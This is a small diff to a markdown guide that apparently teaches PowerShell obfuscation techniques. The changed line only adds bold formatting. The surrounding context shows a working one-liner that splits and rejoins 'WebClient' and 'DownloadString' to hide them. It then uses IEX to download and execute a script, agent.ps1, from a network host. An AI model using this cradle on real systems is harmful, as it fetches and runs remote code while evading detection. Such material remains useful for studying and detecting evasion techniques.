@@ -133,7 +133,7 @@ from $env:comspec variable and uses the **-Join''** operator to take the arraw a
 
 ![powershell obfuscation](http://i.cubeupload.com/Um9qJu.jpg)
 
-- Using an powershell variable ($cmdWithDelim) to **split** the system call and then **-Join** it back again
+- Using an powershell variable (**$cmdWithDelim**) to **split** the system call and then **-Join** it back again
 
       $cmdWithDelim = "(New-Object Net.We~~bClient).Downlo~~adString('http://192.168.1.71/agent.ps1')";IEX ($cmdWithDelim.Split("~~") -Join '') | IEX
 
